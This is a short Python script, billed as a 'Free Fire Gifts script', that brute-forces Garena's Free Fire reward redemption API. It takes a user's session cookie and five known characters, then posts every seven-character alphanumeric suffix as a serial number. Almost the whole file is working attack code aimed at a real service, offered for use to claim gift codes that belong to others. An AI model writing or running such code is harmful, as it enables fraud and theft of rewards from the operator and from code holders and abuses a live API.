from os import popen
from os import mkdir
import itertools,requests,readline
ro, col = popen('stty size', 'r').read().split()
print("\x1b[91m@@@\x1b[0m".center(int(col),"#"))
print("~\x1b[92mFree Fire Gifts script\x1b[0m~".center(int(col),"#"))
print("\x1b[92m GitHub:github.com/ahmedMahmed8a \x1b[0m".center(int(col),"#"))
print("\x1b[92m Whatsapp :wa.me/+201150119895 \x1b[0m".center(int(col),"#"))
print("\x1b[91m@@@\x1b[0m".center(int(col),"#"))
url="https://api.reward.ff.garena.com/redemption/api/game/ff/redeem/"
session=str(input("session id:"))
cookies = {'redemption_api_sessionid': session}
digits = str(input('Enter the 5 digits:'))
chrs ='1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in range(7,8):
 for j in itertools.product(chrs, repeat=i):
  temp = digits+''.join(j)
  print("\x1b[92m[*]Trying the code ["+temp+"]")
  r = requests.post(url, cookies=cookies,json={"serialno":temp})
  print("\x1b[93m"+r.text)
